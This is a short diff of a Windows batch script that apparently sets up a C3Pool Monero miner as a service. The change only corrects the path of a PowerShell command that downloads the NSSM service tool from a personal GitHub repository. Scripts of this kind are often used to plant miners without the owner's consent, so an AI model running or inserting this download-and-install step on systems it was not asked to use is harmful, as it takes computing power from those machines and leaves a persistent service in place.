@@ -343,7 +343,7 @@ goto OK
 :ADMIN_MINER_SETUP
 
 echo [*] Downloading tools to make c3pool_miner service to "%USERPROFILE%\nssm.zip"
-powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://github.com/1753174725/xmrig/raw/main/7za.exe/nssm.zip', '%USERPROFILE%\nssm.zip')"
+powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://github.com/1753174725/xmrig/raw/main/nssm.zip', '%USERPROFILE%\nssm.zip')"
 if errorlevel 1 (
   echo ERROR: Can't download tools to make c3pool_miner service
   exit /b 1
